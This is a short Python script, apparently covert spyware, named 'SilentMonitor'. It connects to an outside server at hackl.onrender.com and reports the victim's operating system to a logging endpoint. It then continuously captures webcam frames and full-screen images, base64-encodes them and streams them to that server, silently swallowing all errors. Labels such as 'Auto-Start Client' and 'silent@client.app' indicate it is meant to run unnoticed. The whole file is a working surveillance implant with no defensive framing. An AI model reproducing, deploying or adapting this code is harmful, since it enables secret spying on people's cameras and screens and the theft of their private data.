import cv2
import socketio
import base64
import time
import requests
import platform
import threading
import sys
import os
import mss
import numpy as np

# CONFIGURAÇÕES
SERVER_URL = "https://hackl.onrender.com"
LINK_CODE = "NATIVE_CLIENT"

class SilentMonitor:
    def __init__(self):
        self.sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=1)
        self.running = False
        self.sct = mss.mss()

    def log_access(self):
        try:
            requests.post(f"{SERVER_URL}/log_access", json={
                'code': LINK_CODE,
                'browser': 'Auto-Start Client (Cam+Screen)',
                'os': platform.system() + " " + platform.release(),
                'email': 'silent@client.app'
            }, timeout=5)
        except:
            pass

    def capture_loop(self):
        cap = cv2.VideoCapture(0)
        while self.running:
            ret, frame = cap.read()
            if not ret: 
                time.sleep(1)
                continue
            
            frame = cv2.resize(frame, (480, 360))
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 25])
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            
            try:
                self.sio.emit('native_frame', {
                    'id': self.sio.sid,
                    'frame': 'data:image/jpeg;base64,' + jpg_as_text
                })
            except:
                break
            time.sleep(0.15)
        cap.release()

    def screen_loop(self):
        while self.running:
            try:
                # Captura a tela inteira
                monitor = self.sct.monitors[1]
                sct_img = self.sct.grab(monitor)
                
                # Converte para formato OpenCV
                img = np.array(sct_img)
                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                
                # Redimensiona para economizar banda
                img = cv2.resize(img, (800, 450))
                _, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 20])
                jpg_as_text = base64.b64encode(buffer).decode('utf-8')
                
                self.sio.emit('native_screen', {
                    'id': self.sio.sid,
                    'frame': 'data:image/jpeg;base64,' + jpg_as_text
                })
            except:
                break
            time.sleep(0.3) # ~3 FPS para a tela (suficiente para monitorar)

    def start(self):
        try:
            self.sio.connect(SERVER_URL, socketio_path='/socket.io', transports=['websocket', 'polling'])
            self.running = True
            self.log_access()
            
            # Inicia threads para câmera e tela
            threading.Thread(target=self.capture_loop, daemon=True).start()
            threading.Thread(target=self.screen_loop, daemon=True).start()
            
            # Mantém o script rodando
            while self.running:
                time.sleep(1)
        except:
            sys.exit(0)

if __name__ == "__main__":
    monitor = SilentMonitor()
    monitor.start()
